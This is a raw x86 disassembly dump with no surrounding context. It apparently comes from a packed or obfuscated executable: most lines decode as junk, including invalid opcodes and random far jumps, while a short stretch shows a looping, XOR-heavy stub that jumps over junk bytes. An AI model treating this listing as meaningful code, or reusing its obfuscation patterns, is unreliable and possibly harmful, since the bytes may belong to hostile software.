  4049a2:	dec    esp
  4049a3:	pop    ds
  4049a4:	mov    ds:0x55623d53,eax
  4049a9:	dec    edi
  4049aa:	push   esp
  4049ac:	and    eax,0xa30bbef7
  4049b1:	inc    edi
  4049b2:	cwde   
  4049b3:	sbb    ah,BYTE PTR [edi]
  4049b5:	inc    ecx
  4049b6:	and    esi,esi
  4049b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049b9:	mov    esp,0x112bc330
  4049be:	or     eax,0xcefce134
  4049c3:	pusha  
  4049c4:	jb     0x404a01
  4049c6:	je     0x4049d3
  4049c8:	stos   DWORD PTR es:[edi],eax
  4049c9:	int3   
  4049ca:	mul    DWORD PTR [ecx+ebx*1]
  4049cd:	aas    
  4049ce:	in     al,dx
  4049cf:	pop    es
  4049d0:	or     edx,DWORD PTR fs:[ecx]
  4049d3:	xchg   ebx,edx
  4049d5:	js     0x4049be
  4049d7:	mov    dl,0xbf
  4049d9:	pop    esp
  4049da:	inc    eax
  4049db:	jge    0x404979
  4049dd:	jne    0x404a40
  4049df:	push   0xec0ffcb5
  4049e4:	and    al,0x1c
  4049e6:	int3   
  4049e7:	aaa    
  4049e8:	arpl   WORD PTR ss:[edx],cx
  4049eb:	pusha  
  4049ec:	leave  
  4049ed:	mov    BYTE PTR [ecx+0x4a],0x9
  4049f1:	cs push 0xffffffcc
  4049f4:	scas   al,BYTE PTR es:[edi]
  4049f5:	jp     0x4049f3
  4049f7:	push   esi
  4049f8:	aaa    
  4049f9:	leave  
  4049fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049fb:	xlat   BYTE PTR ds:[ebx]
  4049fc:	icebp  
  4049fd:	shl    dl,1
  4049ff:	arpl   WORD PTR [esi+0x20],di
  404a02:	xor    esp,DWORD PTR [eax+0x26c597c3]
  404a08:	mov    esp,DWORD PTR [ecx]
  404a0a:	adc    al,0xb9
  404a0c:	sahf   
  404a0d:	xchg   ecx,eax
  404a0e:	icebp  
  404a0f:	in     al,0xa9
  404a11:	push   esp
  404a12:	outs   dx,BYTE PTR ds:[esi]
  404a13:	and    eax,0xdcd2d6cb
  404a18:	lods   eax,DWORD PTR ds:[esi]
  404a19:	out    dx,eax
  404a1a:	adc    al,0x7f
  404a1c:	pop    ebp
  404a1d:	lods   al,BYTE PTR ds:[esi]
  404a1e:	daa    
  404a1f:	sbb    DWORD PTR [ebx],0x7af86d40
  404a25:	xor    edx,DWORD PTR [edi+0x72]
  404a28:	jle    0x404a94
  404a2a:	aam    0xd8
  404a2c:	sti    
  404a2d:	pushf  
  404a2e:	in     al,dx
  404a2f:	popf   
  404a30:	push   0xe90c45ff
  404a35:	ds stc 
  404a37:	(bad)  
  404a38:	(bad)  
  404a39:	jmp    0x404b7e
  404a3e:	cmp    eax,0xf1133703
  404a43:	xor    ebx,ecx
  404a45:	sar    DWORD PTR [edx+esi*1+0x9],1
  404a49:	cld    
  404a4a:	push   ecx
  404a4b:	push   ss
  404a4c:	xor    BYTE PTR [ecx+0x24],cl
  404a4f:	and    DWORD PTR [eax+0x70],esi
  404a52:	sbb    BYTE PTR [edi+0x70],bh
  404a55:	jo     0x404ac3
  404a57:	in     eax,dx
  404a58:	stos   BYTE PTR es:[edi],al
  404a59:	iret   
  404a5a:	lahf   
  404a5b:	dec    ecx
  404a5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a5d:	mov    eax,ds:0x4641887c
  404a62:	inc    esi
  404a63:	fcomp  DWORD PTR [ebx]
  404a65:	push   ss
  404a66:	fstp   QWORD PTR [edx-0x22]
  404a69:	cmp    DWORD PTR [ecx],eax
  404a6b:	pop    es
  404a6c:	test   eax,0xf3414a34
  404a71:	out    dx,eax
  404a72:	test   al,0xb1
  404a74:	repz call 0xe21f7f99
  404a7a:	nop
  404a7b:	inc    ecx
  404a7c:	add    DWORD PTR [ecx+ecx*4+0x48],0xffffffdd
  404a81:	hlt    
  404a82:	jmp    0x404a7f
  404a84:	push   edi
  404a85:	sahf   
  404a86:	jbe    0x404a5e
  404a88:	scas   eax,DWORD PTR es:[edi]
  404a89:	inc    ecx
  404a8a:	aam    0xe8
  404a8c:	or     ebp,DWORD PTR [esi]
  404a8e:	dec    eax
  404a8f:	test   BYTE PTR [ebx],cl
  404a91:	push   cs
  404a92:	jl     0x404ae8
  404a94:	call   0x2f8b:0x5f504b3f
  404a9b:	js     0x404aca
  404a9d:	mov    edx,0x85b82a6
  404aa2:	aad    0x8f
  404aa4:	xchg   esp,eax
  404aa5:	gs inc esp
  404aa7:	pop    eax
  404aa8:	and    dl,ch
  404aaa:	sub    BYTE PTR [ebx-0x44],dl
  404aad:	pop    eax
  404aae:	jnp    0x404b25
  404ab0:	dec    eax
  404ab1:	and    BYTE PTR [eax+ebx*1-0x7b06f6e8],bl
  404ab8:	sub    ebx,DWORD PTR ds:0xbd803a12
  404abe:	and    edi,DWORD PTR [esi-0x76]
  404ac1:	inc    edx
  404ac2:	mov    ah,0x46
  404ac4:	mov    ebx,0xbde3aadc
  404ac9:	sti    
  404aca:	addr16 jp 0x404a57
  404acd:	inc    ebx
  404ace:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404acf:	repz in eax,dx
  404ad1:	push   eax
  404ad2:	js     0x404abd
  404ad4:	xchg   edx,eax
  404ad5:	pop    ebp
  404ad6:	jno    0x404a86
  404ad8:	call   0xd565:0x704c50d
  404adf:	test   al,0xb9
  404ae1:	outs   dx,DWORD PTR ds:[esi]
  404ae2:	out    0xf9,eax
  404ae4:	mov    dh,BYTE PTR [ecx]
  404ae6:	xchg   edi,eax
  404ae7:	(bad)  
  404ae9:	leave  
  404aea:	push   ebx
  404aeb:	lods   eax,DWORD PTR ds:[esi]
  404aec:	stos   DWORD PTR es:[edi],eax
  404aed:	mov    ecx,0x8f9298a9
  404af2:	jmp    0xcb98:0x80b9aea9
  404af9:	mov    edi,0xf49a7490
  404afe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404aff:	dec    esi
  404b00:	ins    DWORD PTR es:[edi],dx
  404b01:	ja     0x404b7c
  404b03:	in     al,0x9
  404b05:	pop    ebx
  404b06:	hlt    
  404b07:	xchg   esi,eax
  404b08:	int3   
  404b09:	es adc dl,bh
  404b0c:	pushf  
  404b0d:	fwait
  404b0e:	xor    DWORD PTR [ecx],ebp
  404b10:	js     0x404b65
  404b12:	mov    eax,ds:0x411db6e0
  404b17:	ror    ecx,cl
  404b19:	and    esp,ecx
  404b1b:	cmp    edi,edi
  404b1d:	push   edx
  404b1e:	shr    BYTE PTR ds:[edx],0xd5
  404b22:	sub    eax,0x13bdeee4
  404b27:	sub    BYTE PTR [eax],dh
  404b29:	mov    eax,ds:0xd3e187e2
  404b2e:	or     esi,edx
  404b30:	add    ch,dl
  404b32:	or     edi,DWORD PTR [ecx-0x31]
  404b35:	pusha  
  404b36:	imul   edx,edx,0xfcecbfe7
  404b3c:	inc    ebp
  404b3d:	add    DWORD PTR [esi-0x3f7e928d],0xffffff8e
  404b44:	out    dx,eax
  404b45:	mov    esi,0xc2eec79f
  404b4a:	xor    BYTE PTR [ebx+0x772dcdd1],ah
  404b50:	nop
  404b51:	xlat   BYTE PTR ds:[ebx]
  404b52:	out    dx,eax
  404b53:	in     eax,0x56
  404b55:	(bad)  
  404b56:	push   ebp
  404b57:	stc    
  404b58:	fwait
  404b59:	popf   
  404b5a:	sbb    DWORD PTR [ebp+0x3a4a5b56],ebx
  404b60:	sti    
  404b61:	cmp    ch,BYTE PTR [ebx+0x71]
  404b64:	cmp    dh,bl
  404b66:	pop    ds
  404b67:	push   ebp
  404b68:	mov    esp,ebp
  404b6a:	jmp    0xbc0f:0x445cc776
  404b71:	es repnz out dx,al
  404b74:	in     al,dx
  404b75:	push   ebp
  404b76:	mov    dh,0x62
  404b78:	mov    edx,0xa73c5301
  404b7d:	and    cl,BYTE PTR [ebx-0x3ecc0fbb]
  404b83:	mov    ecx,DWORD PTR [ebp+0x10]
  404b86:	add    eax,esi
  404b88:	jmp    0x404ccd
  404b8d:	pop    esi
  404b8e:	adc    BYTE PTR [esi-0x8],bh
  404b91:	mov    esi,0x9ce666a6
  404b96:	es icebp 
  404b98:	xor    eax,0x4a583a28
  404b9d:	int3   
  404b9e:	and    BYTE PTR [eax+0x70],dh
  404ba1:	sbb    BYTE PTR [edi+0x70],bh
  404ba4:	jo     0x404b4d
  404ba6:	inc    ebp
  404ba7:	pop    es
  404ba8:	jg     0x404b50
  404baa:	jp     0x404bf3
  404bac:	dec    ecx
  404bad:	pop    esi
  404bae:	int    0x95
  404bb0:	push   eax
  404bb1:	lods   al,BYTE PTR ds:[esi]
  404bb2:	or     BYTE PTR [ecx],dl
  404bb4:	popa   
  404bb5:	or     ecx,DWORD PTR [esp+edi*2]
  404bb8:	inc    ebx
  404bb9:	ds add ch,bh
  404bbc:	in     al,dx
  404bbd:	pop    ebp
  404bbe:	ret    
  404bbf:	pop    esi
  404bc0:	jnp    0x404b42
  404bc2:	mov    ecx,ebp
  404bc4:	mov    bh,0xf3
  404bc6:	mov    al,bh
  404bc8:	je     0xb81861d
  404bce:	mov    cl,dl
  404bd0:	stos   BYTE PTR es:[edi],al
  404bd1:	fdiv   st(3),st
  404bd3:	mov    eax,ds:0xdbdbb597
  404bd8:	int3   
  404bd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bda:	cld    
  404bdb:	and    al,0x21
  404bdd:	xor    BYTE PTR [ecx],0x76
  404be0:	arpl   WORD PTR [edi],cx
  404be2:	adc    edx,esp
  404be4:	jbe    0x404b8c
  404be6:	jae    0x404b9f
  404be8:	in     al,0x7c
  404bea:	js     0x404c3b
  404bec:	pop    edx
  404bed:	retf   
  404bee:	aas    
  404bef:	jmp    0x404b8c
  404bf1:	(bad)  
  404bf2:	in     eax,dx
  404bf3:	dec    ebp
  404bf4:	or     eax,0xf168aebf
  404bf9:	mov    edx,DWORD PTR [ecx]
  404bfb:	xor    al,0xad
  404bfd:	retf   0xc1b1
  404c00:	cmp    edx,0xc2436d77
  404c06:	xchg   esp,eax
  404c07:	ds sbb al,0x2e
  404c0a:	sub    eax,0xfdb63229
  404c0f:	mul    BYTE PTR [eax+esi*8+0x5f]
  404c13:	jmp    0xcaa2e839
  404c18:	add    ecx,DWORD PTR [esi+0x47]
  404c1b:	jnp    0x404c0d
  404c1d:	imul   ebp,DWORD PTR [ebx-0x72c6f0c8],0x909fbef2
  404c27:	push   esi
  404c28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c29:	mov    edi,0x34db5727
  404c2e:	push   eax
  404c2f:	dec    edx
  404c30:	jns    0x404bcb
  404c32:	sbb    BYTE PTR [edi],al
  404c34:	imul   al
  404c36:	sub    DWORD PTR [ebx-0x54d9470b],edx
  404c3c:	pop    ds
  404c3d:	call   0xf825:0xb62cc81c
  404c44:	mov    WORD PTR ds:0xb1aa56e8,ss
  404c4a:	repnz add al,0x46
  404c4d:	xlat   BYTE PTR ds:[ebx]
  404c4e:	mov    eax,0xdc7a0381
  404c53:	push   es
  404c54:	les    ebp,FWORD PTR [ebx+0x75]
  404c57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c58:	push   0xffffffe7
  404c5a:	aas    
  404c5b:	sub    eax,0xbd6c4342
  404c60:	fisttp DWORD PTR [ecx+0x1ddbb6e]
  404c66:	inc    ebx
  404c67:	rcl    DWORD PTR [esi+esi*8+0x22],1
  404c6b:	cmp    BYTE PTR [edi+0x1b56d0da],0x79
  404c72:	mov    al,ds:0xc9654c2f
  404c77:	adc    edx,esi
  404c79:	pop    edi
  404c7a:	rol    edi,0xa3
  404c7d:	ret    0x44fe
  404c80:	inc    esp
  404c81:	push   ecx
  404c82:	push   edx
  404c83:	out    dx,eax
  404c84:	adc    bl,BYTE PTR [edi]
  404c86:	push   cs
  404c87:	fs jno 0x404cec
  404c8a:	imul   esi,edx,0xb1dc4851
  404c90:	or     BYTE PTR [edx-0x3d],bh
  404c93:	dec    esp
  404c94:	pop    esi
  404c95:	mov    cl,0xca
  404c97:	mov    esp,0x1b1e6aae
  404c9c:	cmp    al,0x82
  404c9e:	sahf   
  404c9f:	xchg   BYTE PTR [ebx],ch
  404ca1:	test   DWORD PTR [edi-0x4dba9dee],edi
  404ca7:	xchg   BYTE PTR ds:0x5ea539e0,bl
  404cad:	push   ebx
  404cae:	aaa    
  404caf:	ror    DWORD PTR [edi+0xf],cl
  404cb2:	gs jae 0x404cd4
  404cb5:	mov    ds:0xffed73f4,eax
  404cba:	ja     0x404ccc
  404cbc:	mov    ds:0x6628d077,eax
  404cc1:	or     DWORD PTR [ebx+eax*1+0x2ce73474],edi
  404cc8:	retf   
  404cc9:	or     al,0xc3
  404ccb:	int    0x5e
  404ccd:	mov    DWORD PTR [ecx],eax
  404ccf:	pop    esi
  404cd0:	leave  
  404cd1:	ret    0xc
  404cd4:	push   ebp
  404cd5:	mov    ebp,esp
  404cd7:	push   ecx
  404cd8:	push   ecx
  404cd9:	sub    DWORD PTR ds:0x432dd6,0x432704
  404ce3:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  404cea:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  404cf1:	and    DWORD PTR ds:0x43437e,0x0
  404cfb:	xor    ecx,ecx
  404cfd:	add    ecx,DWORD PTR ds:0x43437e
  404d03:	inc    ecx
  404d04:	mov    DWORD PTR ds:0x43437e,ecx
  404d0a:	cmp    DWORD PTR ds:0x43437e,0x26
  404d11:	jne    0x404d52
  404d17:	push   DWORD PTR [ebp-0x20]
  404d1a:	push   DWORD PTR [ebp-0x24]
  404d1d:	push   0x434382
  404d22:	push   0x43438e
  404d27:	push   DWORD PTR [ebp-0x28]
  404d2a:	push   0x6ce4
  404d2f:	push   0x479e
  404d34:	push   DWORD PTR [ebp-0xc]
  404d37:	push   DWORD PTR [ebp-0x14]
  404d3a:	push   0x7cf9
  404d3f:	push   0x1b21
  404d44:	push   0x8797
  404d49:	push   DWORD PTR [ebp-0x24]
  404d4c:	call   DWORD PTR ds:0x432c32
  404d52:	cmp    DWORD PTR ds:0x43437e,0x1a
  404d59:	jb     0x404cfb
  404d5f:	neg    edx
  404d61:	mov    eax,DWORD PTR [ebp-0x4]
  404d64:	push   esi
  404d65:	xor    ecx,0x4a51
  404d6b:	mov    esi,DWORD PTR [ebp-0x8]
  404d6e:	mov    edx,0x7510855
  404d73:	xor    eax,edx
  404d75:	xor    esi,edx
  404d77:	mov    ecx,0x32729c
  404d7c:	adc    DWORD PTR ds:0x43441d,0x4006
  404d86:	jmp    0x40500a
  404d8b:	popa   
  404d8c:	sahf   
  404d8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d8e:	mov    fs,WORD PTR [ebx-0x6b]
  404d91:	jno    0x404e04
  404d93:	mov    al,ds:0x6419e646
  404d98:	or     al,0xe9
  404d9a:	push   ebx
  404d9b:	hlt    
  404d9c:	das    
  404d9d:	jo     0x404e0f
  404d9f:	fnstcw WORD PTR [esi+0x70]
  404da2:	jo     0x404d3d
  404da4:	mov    ch,BYTE PTR [edx+0x1e79e602]
  404daa:	cwde   
  404dab:	test   BYTE PTR [esi],bh
  404dad:	sub    edx,esi
  404daf:	push   0xffffffaa
  404db1:	and    eax,0x9f43bbc
  404db6:	ins    DWORD PTR es:[edi],dx
  404db7:	shl    BYTE PTR [edx-0x40],1
  404dba:	push   esp
  404dbb:	mov    ebx,cr6
  404dbe:	inc    edx
  404dbf:	out    dx,eax
  404dc0:	pop    esi
  404dc1:	mov    eax,gs:0xbf0f1d63
  404dc7:	out    dx,eax
  404dc8:	sub    edi,DWORD PTR [edi]
  404dca:	scas   al,BYTE PTR es:[edi]
  404dcb:	int    0x62
  404dcd:	dec    edi
  404dce:	je     0x404e44
  404dd0:	in     eax,dx
  404dd1:	lock movs DWORD PTR es:[edi],DWORD PTR ss:[esi]
  404dd4:	lods   ax,WORD PTR ds:[esi]
  404dd6:	add    BYTE PTR [edx+0x5e30713f],0x30
  404ddd:	lock (bad) 
  404ddf:	add    ecx,eax
  404de1:	and    al,0x66
  404de3:	(bad)  
  404de4:	sahf   
  404de5:	dec    esp
  404de6:	out    dx,al
  404de7:	aam    0x17
  404de9:	xor    BYTE PTR [ebp-0x3b5d774],bl
  404def:	xchg   esp,eax
  404df0:	out    dx,eax
  404df1:	xchg   DWORD PTR [ecx],edx
  404df3:	ds out dx,al
  404df5:	(bad)  
  404df6:	das    
  404df7:	ins    DWORD PTR es:[edi],dx
  404df8:	fsincos 
  404dfa:	retf   0x26de
  404dfd:	mov    al,0xe0
  404dff:	or     al,0xb3
  404e01:	jmp    0x3d95:0x268bc3e2
  404e08:	(bad)  
  404e0a:	cwde   
  404e0b:	sbb    bl,BYTE PTR [esi]
  404e0d:	pop    esp
  404e0e:	sbb    al,0x56
  404e10:	out    dx,al
  404e11:	lds    edi,FWORD PTR [ecx]
  404e13:	mov    eax,0x411a2ffa
  404e18:	mov    eax,DWORD PTR [esi+0x4976a8b9]
  404e1e:	test   edi,esi
  404e20:	sbb    bh,BYTE PTR [ebx]
  404e22:	fsub   QWORD PTR [edi-0x6d]
  404e25:	cdq    
  404e26:	into   
  404e27:	xchg   dx,ax
  404e29:	outs   dx,BYTE PTR ds:[esi]
  404e2a:	stc    
  404e2b:	add    al,0xa4
  404e2d:	jno    0x404e87
  404e2f:	call   0x280c:0x96792460
  404e36:	mov    ebp,0x245def5e
  404e3b:	divps  xmm6,xmm0
  404e3e:	pop    edx
  404e3f:	fwait
  404e40:	jmp    0x96b88958
  404e45:	and    al,BYTE PTR [ecx-0x4]
  404e48:	jl     0x404e25
  404e4a:	imul   ebx,DWORD PTR [esi-0x65],0x4f
  404e4e:	and    al,0x15
  404e50:	loop   0x404e3b
  404e52:	inc    edi
  404e53:	mov    ds:0xb0585c2f,eax
  404e58:	sub    ecx,0x1d
  404e5b:	shr    DWORD PTR [ecx+0x20622a],cl
  404e61:	out    dx,eax
  404e62:	dec    esp
  404e63:	sbb    al,0xd5
  404e65:	sub    al,0xb3
  404e67:	outs   dx,BYTE PTR ds:[esi]
  404e68:	pop    ds
  404e69:	mov    ch,0xcb
  404e6b:	ins    DWORD PTR es:[edi],dx
  404e6c:	lods   eax,DWORD PTR ds:[esi]
  404e6d:	dec    ebp
  404e6e:	popf   
  404e6f:	enter  0xe8cd,0x3a
  404e73:	pop    esi
  404e74:	arpl   di,bx
  404e76:	push   ecx
  404e77:	jnp    0x404e9f
  404e79:	mov    ecx,0xd4ccf46b
  404e7e:	daa    
  404e7f:	cbw    
  404e81:	repz xor BYTE PTR [ebx-0x57f32a11],bh
  404e88:	cmp    eax,0x87c6e863
  404e8d:	loope  0x404ef9
  404e8f:	add    BYTE PTR [eax-0x53],bl
  404e92:	xor    ebx,DWORD PTR [edx+0x43]
  404e95:	mov    al,0x47
  404e97:	out    dx,eax
  404e98:	mov    ds:0x48a1e217,al
  404e9d:	push   es
  404e9e:	out    0xee,al
  404ea0:	test   al,0x8b
  404ea2:	leave  
  404ea3:	ret    0xc46e
  404ea6:	sub    al,0xa5
  404ea8:	xchg   ecx,eax
  404ea9:	stos   BYTE PTR es:[edi],al
  404eaa:	fisttp QWORD PTR [ebp-0x76]
  404ead:	loop   0x404ef4
  404eaf:	sub    ebp,esi
  404eb1:	call   0x92df:0x2c081a60
  404eb8:	es xchg esi,eax
  404eba:	push   ss
  404ebb:	dec    ebp
  404ebc:	lahf   
  404ebd:	dec    ebx
  404ebe:	ror    DWORD PTR [ebx+0x393e6f11],0x2f
  404ec5:	lahf   
  404ec6:	fild   DWORD PTR [esi+0x62]
  404ec9:	int    0x6
  404ecb:	or     eax,0x5b2e29dc
  404ed0:	stc    
  404ed1:	cs push ebp
  404ed3:	mov    BYTE PTR [edx-0x3e],cl
  404ed6:	xor    bh,ah
  404ed8:	add    bh,BYTE PTR [esp+ecx*1]
  404edb:	imul   ebx,DWORD PTR [esi+0x22],0x14
  404edf:	and    bl,BYTE PTR [eax+0x7d]
  404ee2:	out    0xfa,al
  404ee4:	and    dl,0x82
  404ee7:	jbe    0x404f47
  404ee9:	sar    BYTE PTR [ebx],1
  404eeb:	xchg   esi,eax
  404eec:	stos   BYTE PTR es:[edi],al
  404eed:	or     al,0x48
  404eef:	out    0xd6,eax
  404ef1:	das    
  404ef2:	jnp    0x404ee5
  404ef4:	adc    ecx,DWORD PTR [ebx-0x20]
  404ef7:	(bad)  
  404ef8:	popf   
  404ef9:	outs   dx,DWORD PTR ds:[esi]
  404efa:	inc    edi
  404efb:	pxor   mm6,QWORD PTR [eax-0x493fca26]
  404f02:	add    DWORD PTR [edi-0x2e411a07],eax
  404f08:	mov    edi,0x6d92586c
  404f0d:	xchg   ebx,eax
  404f0e:	mov    ds:0x6028d6e0,eax
  404f13:	(bad)  [eax]
  404f15:	push   0xa1ae8e8b
  404f1a:	ja     0x404f01
  404f1c:	sub    BYTE PTR [edx+0x5c],cl
  404f1f:	arpl   WORD PTR ds:0xef21ffc1,bp
  404f25:	fnstsw WORD PTR [ebp-0x5d]
  404f28:	(bad)  
  404f2a:	xchg   ecx,eax
  404f2b:	stos   DWORD PTR es:[edi],eax
  404f2c:	xchg   edx,eax
  404f2d:	inc    esi
  404f2e:	pop    ds
  404f2f:	cmp    BYTE PTR [ecx+0x4810f8d0],0xb8
  404f36:	lahf   
  404f37:	mov    bh,0x81
  404f39:	adc    dl,BYTE PTR [ebx-0x79]
  404f3c:	jp     0x404f95
  404f3e:	mov    BYTE PTR [ebx],dh
  404f40:	pop    esp
  404f41:	push   ebp
  404f42:	push   eax
  404f43:	adc    esi,DWORD PTR [edx-0x29]
  404f46:	jo     0x404f58
  404f48:	xchg   esi,eax
  404f49:	mov    bl,0x54
  404f4b:	pop    ss
  404f4c:	dec    eax
  404f4d:	lock fcomp QWORD PTR [ebx]
  404f50:	rsqrtps xmm0,xmm1
  404f53:	icebp  
  404f54:	repz ror BYTE PTR [eax],cl
  404f57:	adc    DWORD PTR [eax],ebp
  404f59:	and    esi,DWORD PTR fs:[ecx+0xc440f0f]
  404f60:	leave  
  404f61:	pop    eax
  404f62:	mov    esp,0x99fa490
  404f67:	data16 jb 0x404ef8
  404f6a:	xchg   edi,eax
  404f6b:	xchg   BYTE PTR [edi],al
  404f6d:	mov    cs,WORD PTR [ecx-0x5bd7ea25]
  404f73:	push   esp
  404f74:	(bad)  
  404f77:	repnz pop es
  404f79:	out    dx,al
  404f7a:	bound  ebp,QWORD PTR [ebx+eiz*4+0x69f32db6]
  404f81:	xor    BYTE PTR [ebp-0x27fba251],ch
  404f87:	rol    DWORD PTR [ecx+ecx*8],cl
  404f8a:	push   ss
  404f8b:	addr16 (bad) 
  404f8d:	test   DWORD PTR [ebp+edx*2+0x55],ecx
  404f91:	popa   
  404f92:	arpl   bx,bx
  404f94:	cmp    ebp,edi
  404f96:	xor    al,0x26
  404f98:	sbb    edi,DWORD PTR [ebx]
  404f9a:	mov    cl,BYTE PTR [ebp-0x6c078cfb]
  404fa0:	(bad)  
  404fa1:	xlat   BYTE PTR ds:[ebx]
  404fa2:	pop    esp
  404fa3:	xchg   edi,eax
  404fa4:	add    BYTE PTR [eax-0x5acabda3],ah
  404faa:	push   ds
  404fab:	sub    al,BYTE PTR [ecx-0x227fc20d]
  404fb1:	test   al,0x9f
  404fb3:	pcmpeqd mm7,mm1
  404fb6:	jne    0x404f87
  404fb8:	ror    DWORD PTR ds:0x212c51a0,1
  404fbe:	jae    0x404f70
  404fc0:	sub    al,0xa7
  404fc2:	pop    ebx
  404fc3:	add    ebp,edi
  404fc5:	hlt    
  404fc6:	mov    ah,0x42
  404fc8:	inc    eax
  404fc9:	ins    DWORD PTR es:[edi],dx
  404fca:	js     0x404f94
  404fcc:	cmp    ch,BYTE PTR [edx-0x13d6b877]
  404fd2:	xchg   edx,eax
  404fd3:	mov    bh,0x7c
  404fd5:	enter  0xc8da,0xcd
  404fd9:	ss retf 0x4730
  404fdd:	cli    
  404fde:	jge    0x40505a
  404fe0:	adc    eax,0xd70a8106
  404fe5:	push   edx
  404fe6:	loopne 0x405044
  404fe8:	cmp    bh,BYTE PTR [esi-0x71]
  404feb:	inc    esp
  404fec:	xor    eax,0x7d6de699
  404ff1:	xor    al,0x84
  404ff3:	ja     0x404ff3
  404ff5:	mov    ecx,0x563c2da7
  404ffa:	and    BYTE PTR [edi],ah
  404ffc:	push   esp
  404ffd:	int    0x4
  404fff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405000:	mov    eax,ds:0xc2a5e484
  405005:	loope  0x40500c
  405007:	inc    esp
  405008:	or     edi,DWORD PTR [ecx]
  40500a:	add    esi,ecx
  40500c:	xor    DWORD PTR ds:0x434396,0x260
  405016:	add    eax,ecx
  405018:	imul   eax,esi
  40501b:	mov    DWORD PTR ds:0x43438a,0x336a
  405025:	mov    esi,DWORD PTR [ebp+0xc]
  405028:	mov    DWORD PTR ds:0x434396,0x44f4
  405032:	cmp    esi,eax
  405034:	mov    DWORD PTR ds:0x432dca,0x3ddd
  40503e:	jne    0x4052de
  405044:	mov    eax,DWORD PTR [ebp-0x4]
  405047:	mov    esi,DWORD PTR [ebp-0x8]
  40504a:	xor    eax,edx
  40504c:	jmp    0x4052d0
  405051:	test   DWORD PTR [ebp+0xb],ebx
  405054:	cmp    al,0xf3
  405056:	push   0x55
  405058:	popa   
  405059:	and    DWORD PTR [esi],0x2f
  40505c:	adc    al,0x62
  40505e:	ss mov ebp,0x702d5d62
  405064:	jo     0x40503f
  405066:	jle    0x4050d8
  405068:	jo     0x405041
  40506a:	retf   
  40506b:	cmovle edi,DWORD PTR [edi]
  40506e:	ins    DWORD PTR es:[edi],dx
  40506f:	ror    DWORD PTR [ebp-0x2696f2c0],0x22
  405076:	cmp    BYTE PTR [edi],dl
  405078:	dec    ebx
  405079:	mov    eax,0xde7b359d
  40507e:	and    eax,0x5c3965f
  405083:	rcl    DWORD PTR [ecx+eiz*2+0x737cbe89],1
  40508a:	mov    al,ds:0x3330164d
  40508f:	sbb    eax,0x1bb61480
  405094:	mov    al,ds:0xc4bdd75b
  405099:	xor    DWORD PTR [esi],edi
  40509b:	retf   0x5179
  40509e:	pop    ss
  40509f:	test   DWORD PTR [ecx+0x1bf8fd30],0x7dfaedb4
  4050a9:	xor    esp,DWORD PTR [ebp+0x1847ab72]
  4050af:	mov    ah,ch
  4050b1:	cmp    ch,BYTE PTR [eax+0x62]
  4050b4:	jns    0x405092
  4050b6:	push   ebx
  4050b7:	cdq    
  4050b8:	mov    edx,0xc3206716
  4050bd:	cld    
  4050be:	stos   BYTE PTR es:[edi],al
  4050bf:	cmp    cl,BYTE PTR [eax-0x6b51ff6a]
  4050c5:	sbb    al,0xce
  4050c7:	xlat   BYTE PTR ds:[ebx]
  4050c8:	retf   
  4050c9:	ins    BYTE PTR es:[edi],dx
  4050ca:	and    edx,0xcad96104
  4050d0:	shl    BYTE PTR [esp+esi*2],1
  4050d3:	daa    
  4050d4:	sub    al,0x4a
  4050d6:	lahf   
  4050d7:	out    dx,eax
  4050d8:	jmp    0x3d0d:0xe3feec6f
  4050df:	jle    0x40513c
  4050e1:	or     cl,0xc3
  4050e4:	ins    DWORD PTR es:[edi],dx
  4050e5:	cld    
  4050e6:	in     eax,dx
  4050e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050e8:	cmp    ah,BYTE PTR [ebx+0x8]
  4050eb:	cmp    BYTE PTR [bp+si],cl
  4050ee:	addr16 pushf 
  4050f0:	cmp    al,0x84
  4050f2:	xor    eax,ebp
  4050f4:	jge    0x40516b
  4050f6:	jge    0x40516f
  4050f8:	data16 xor ch,BYTE PTR [edx+0x10c07359]
  4050ff:	cmp    cl,ah
  405101:	xor    al,0xb
  405103:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405105:	mov    cl,0x1a
  405107:	repz and BYTE PTR [ecx+0x43493114],bh
  40510e:	pop    es
  40510f:	lds    ebp,FWORD PTR [ebx-0x5f]
  405112:	enter  0x3937,0x84
  405116:	push   edx
  405117:	push   eax
  405118:	add    ecx,ebp
  40511a:	dec    edx
  40511b:	(bad)  
  40511c:	dec    edi
  40511d:	jb     0x4050ac
  40511f:	sbb    ebx,DWORD PTR [esi+0x30644e7]
  405125:	mov    ebx,0x33507de2
  40512a:	adc    esi,DWORD PTR [ebx]
  40512c:	cmc    
  40512d:	push   ecx
  40512e:	pop    edx
  40512f:	cs pushf 
  405131:	cmc    
  405132:	and    dh,BYTE PTR [ebx+ecx*4+0x78]
  405136:	out    dx,eax
  405137:	xchg   edi,eax
  405138:	cmp    DWORD PTR [edx+0x5],esp
  40513b:	loop   0x4051af
  40513d:	add    eax,ecx
  40513f:	pop    eax
  405140:	iret   
  405141:	dec    edx
  405142:	xor    BYTE PTR [edi+ecx*4-0x27],0xce
  405147:	cmp    eax,0xfbd8b1c6
  40514c:	pop    ds
  40514d:	fidivr DWORD PTR [ebp+0x38]
  405150:	lahf   
  405151:	sbb    DWORD PTR [edx-0x46],eax
  405154:	fnsetpm(287 only) 
  405156:	pop    ebx
  405157:	scas   al,BYTE PTR es:[edi]
  405158:	pop    ss
  405159:	and    edx,esp
  40515b:	es cld 
  40515d:	jmp    0xde6f:0x19781ac8
  405164:	mov    DWORD PTR [ebx-0x66],eax
  405167:	pop    ebx
  405168:	retf   0x1939
  40516b:	fsub   QWORD PTR [esi-0x71]
  40516e:	add    DWORD PTR [edi-0x11],ebp
  405171:	les    esp,FWORD PTR [edi+0x5430bd0]
  405177:	mov    bh,0x52
  405179:	jle    0x40519a
